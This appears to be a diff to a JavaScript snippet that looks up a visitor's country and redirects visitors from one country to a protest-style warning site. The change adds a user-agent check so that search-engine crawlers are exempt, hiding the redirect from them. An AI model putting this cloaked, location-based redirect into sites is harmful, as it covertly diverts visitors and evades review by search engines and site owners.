@@ -10,9 +10,11 @@ fetch("https://ipapi.co/country/")
     })
     .then((country) => {
         if (country == redirectCountry) {
-            // Action needed - redirecting visitor to warning about outdated regime.
-            console.log("Redirecting");
-            window.location = otherSite;
+            // Double checking if it is a human or a bot like Google
+            if(isHuman()){
+                // Action needed - redirecting visitor to warning about outdated regime.
+                window.location = otherSite;
+            }
         }
     })
     .catch(function (error) {
@@ -21,3 +23,13 @@ fetch("https://ipapi.co/country/")
         // 429 error (too many requests)
         console.log(error);
 });
+
+function isHuman() {
+  if (
+    /bot|google|baidu|bing|msn|teoma|slurp|yandex/i.test(navigator.userAgent)
+  ) {
+    return false;
+  } else {
+    return true;
+  }
+}
